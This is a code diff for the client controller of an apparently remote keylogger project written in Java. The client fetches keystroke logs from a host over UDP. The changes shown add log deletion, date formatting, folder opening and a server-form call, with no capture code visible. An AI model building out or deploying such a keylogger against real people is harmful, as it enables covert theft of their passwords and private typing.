@@ -1,9 +1,11 @@
 package com.hao.keylogger.controllers.Client;
 
+import java.awt.Desktop;
 import java.io.File;
 import java.io.IOException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.StringTokenizer;
@@ -50,10 +52,13 @@ public class ClientLogController {
 		}
 		view.setLogContent(logContent);
 		view.scrollLogViewToTop();
-		view.updateLogInfo("host: " + currentLog.getHost() + " | port: " + currentLog.getPort() + " | Date: " + currentLog.getDateOfLog().toString());
+		SimpleDateFormat sdf = new SimpleDateFormat("EEE dd/MM/yyyy");
+		view.updateLogInfo("Host: " + currentLog.getHost() + " | Port: " + currentLog.getPort() + " | Date: " + sdf.format(currentLog.getDateOfLog()));	
+		
 	}
 
 	public void fetchLog(Date date) {
+		logs.clear();
 		try {
 			// the log will be displayed when it is fetched
 			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).fetchLog(date);
@@ -86,6 +91,7 @@ public class ClientLogController {
 		if (logs.size() == 0) {
 			view.showInfoMessage("Key logger", "No logs fetched");
 			view.setLogList(new ArrayList<String>());
+			view.updateLogInfo("");
 			return;
 		}
 		this.logs = logs;
@@ -123,7 +129,7 @@ public class ClientLogController {
 
 	private void writeToFile(Log log) throws IOException {
 		String filePath = Resources.LOGS_CLIENT_DIRECTORY + File.separator + log.getName()
-				+ Resources.LOG_FILE_EXTENSION;
+				+ Resources.LOG_OBJECT_FILE_EXTENSION;
 		// FileManager fm = new FileManager(filePath);
 		// fm.writeToFile(log.getContent());
 
@@ -239,6 +245,42 @@ public class ClientLogController {
 
 	public void receiveMessage(String msg) {
 		view.showErrorMessage("Fetch log", msg);		
+	}
+
+	public boolean deleteSavedLogs() {
+		File logFolder = new File(Resources.LOGS_CLIENT_DIRECTORY);
+		if (!logFolder.exists()) {
+			return false;
+		}
+		for (File f : logFolder.listFiles()) {
+			try {
+				f.delete();
+			} catch (Exception e) {
+				return false;
+			}
+		}
+		return true;
+	}
+
+	public boolean manageLogs() {
+		try {
+			File logsDir = new File(Resources.LOGS_CLIENT_DIRECTORY);
+			if (!logsDir.exists()) {
+				throw new IOException("Log directory not found!");
+			}
+			Desktop.getDesktop().open(logsDir);
+			return true;
+		} catch (IOException e) {
+		return false;
+		}
+	}
+
+	public void showServerForm() {
+		try {
+			new UDPClientHelper(this, view.getHostAddress(), view.getPort()).showServerForm();
+		} catch (SocketException | UnknownHostException e) {
+			e.printStackTrace();
+		}
 	}
 
 }
